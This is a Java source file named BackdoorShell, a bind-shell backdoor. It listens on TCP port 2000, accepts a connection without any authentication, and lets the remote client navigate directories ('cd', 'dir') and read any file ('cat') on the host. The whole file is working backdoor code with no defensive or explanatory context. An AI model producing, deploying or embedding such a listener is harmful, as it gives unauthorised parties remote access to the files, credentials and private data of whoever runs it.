import java.net.*;
import java.io.*;

public class BackdoorShell {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(2000);
        } catch (IOException e) {
            System.err.println("Could not listen on port: 2000.");
            System.exit(1);
        }

        Socket clientSocket = null;
        try {
            System.out.println("Waiting for connection...");
            clientSocket = serverSocket.accept();
            System.out.println("Connection accepted.");
        } catch (IOException e) {
            System.err.println("Accept failed.");
            System.exit(1);
        }

        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        String inputLine;

        String currentDir = System.getProperty("user.dir");
        String homeDir = currentDir;

        out.println(currentDir + " %");

        while ((inputLine = in.readLine()) != null) {
            if (inputLine.equals("cd .")) {
                // do nothing
            } else if (inputLine.equals("cd")) {
                currentDir = System.getProperty("user.dir");
                out.println(currentDir);
            } else if (inputLine.equals("cd ~")) {
                currentDir = homeDir;
            } else if (inputLine.equals("cd ..")) {
                File dir = new File(currentDir);
                String parentDir = dir.getParent();
                if (parentDir != null) {
                    currentDir = parentDir;
                }
            } else if (inputLine.startsWith("cd ")) {
                String[] tokens = inputLine.split(" ");
                String path = tokens[1];
                if (path.equals("/")) {
                    currentDir = "/";
                } else {
                    File dir = new File(currentDir + File.separator + path);
                    if (dir.exists() && dir.isDirectory()) {
                        currentDir = dir.getAbsolutePath();
                    } else {
                        out.println("Directory not found.");
                    }
                }
            } else if (inputLine.equals("dir")) {
                File dir = new File(currentDir);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    out.println("Number of files in " + currentDir + ": " + files.length);
                    int numFiles = 0;
                    int numDirs = 0;
                    for (File file : files) {
                        if (file.isDirectory()) {
                            numDirs++;
                        } else {
                            numFiles++;
                        }
                        String type = file.isDirectory() ? "directory" : "file";
                        out.println(file.getName() + " (" + type + ")");
                    }
                    out.println("\n" + numDirs + " directories, " + numFiles + " files");
                } else {
                    out.println("Directory not found.");
                }
            } else if (inputLine.startsWith("cat ")) {
                String[] tokens = inputLine.split(" ");
                String filename = tokens[1];
                File file = new File(currentDir + File.separator + filename);
                if (file.exists() && file.isFile()) {
                    BufferedReader fileReader = new BufferedReader(new FileReader(file));
                    String line;
                    while ((line = fileReader.readLine()) != null) {
                        out.println(line);
                    }
                    fileReader.close();
                } else {
                    out.println("File not found.");
                }
            } else {
                out.println("Unknown command.");
            }
            out.println(currentDir + " %");
        }

        out.close();
        in.close();
        clientSocket.close();
        serverSocket.close();
    }
}
